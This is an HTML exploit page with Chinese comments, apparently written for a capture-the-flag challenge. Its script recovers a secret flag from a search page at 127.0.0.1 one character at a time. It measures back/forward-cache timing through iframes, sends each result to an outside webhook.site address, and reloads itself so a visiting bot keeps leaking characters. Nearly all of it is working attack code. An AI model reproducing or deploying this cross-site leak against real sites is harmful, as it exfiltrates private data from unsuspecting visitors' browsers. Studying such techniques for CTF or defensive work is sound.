<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>BFCache XS-Search (Iframe Auto-Compare)</title>
</head>
<body>
    <h2 id="status">正在探测，请查看 Webhook 日志...</h2>
    <script>
        // ==========================================
        // 1. 【必须修改】填入你刚刚新申请的 Webhook 地址！
        const WEBHOOK = "https://webhook.site/6e317036-7838-4b64-8d18-49447072c496";
        // ==========================================
        
        const TARGET = "http://127.0.0.1/search.php?q=";
        const DUMMY = new URL('dummy.html', window.location.href).href;

        function sendLog(msg) {
            navigator.sendBeacon(`${WEBHOOK}?msg=${encodeURIComponent(msg)}`);
        }

        const sleep = ms => new Promise(r => setTimeout(r, ms));
        
        // 遇到假阳性后，我们需要从头开始，请确保清空了 localStorage
        let currentFlag = localStorage.getItem('ctf_flag') || "SUCTF{";
        const charset = ['0', '1', '}'];

        async function measureTiming(guess) {
            return new Promise(async resolve => {
                // 使用 iframe 代替弹窗，完美绕过拦截
                let iframe = document.createElement('iframe');
                document.body.appendChild(iframe);

                // 1. 加载目标搜索页
                iframe.src = TARGET + encodeURIComponent(guess);
                await sleep(1000); // 等待目标页面加载并注册可能存在的 unload

                // 2. 跳转到同源垫脚石页面
                iframe.src = DUMMY;
                while (true) {
                    try {
                        if (iframe.contentWindow.dummyLoaded) break;
                    } catch(e) {}
                    await sleep(50);
                }
                await sleep(200); // 稳定历史记录栈

                // 3. 触发后退并精确计时
                let start = performance.now();
                iframe.contentWindow.history.back();

                // 4. 轮询跨域异常（当 iframe 退回 127.0.0.1 时会报跨域错，借此精确卡秒）
                let timer = setInterval(() => {
                    try {
                        let href = iframe.contentWindow.location.href;
                    } catch (e) {
                        let end = performance.now();
                        clearInterval(timer);
                        iframe.remove();
                        resolve(end - start);
                    }
                }, 1);
            });
        }

        async function run() {
            sendLog(`\n[START] 开始测试下一位，当前进度: ${currentFlag}`);
            let times = {};
            
            // 对 0, 1, } 分别测一次真实时间
            for (let c of charset) {
                let guess = currentFlag + c;
                document.getElementById('status').innerText = `正在测试: ${guess}`;
                times[c] = await measureTiming(guess);
                sendLog(`[*] 测试 ${c} 耗时: ${times[c].toFixed(2)} ms`);
            }

            // 智能比对：找出耗时最短的字符（进入 BFCache 的一定是毫秒级，而没进入的会几十毫秒）
            let minChar = charset[0];
            let minTime = times[minChar];
            for (let c of charset) {
                if (times[c] < minTime) {
                    minTime = times[c];
                    minChar = c;
                }
            }

            sendLog(`[+] 比较完成！耗时最短为 ${minChar}，认定为命中！`);
            
            if (minChar === '}') {
                sendLog(`[!] 恭喜！获取到最终 Flag: ${currentFlag}}`);
                localStorage.clear();
                return;
            }

            // 保存进度并刷新页面，让 Bot 继续测下一位
            localStorage.setItem('ctf_flag', currentFlag + minChar);
            setTimeout(() => location.reload(), 500);
        }

        window.onload = () => setTimeout(run, 500);
    </script>
</body>
</html>
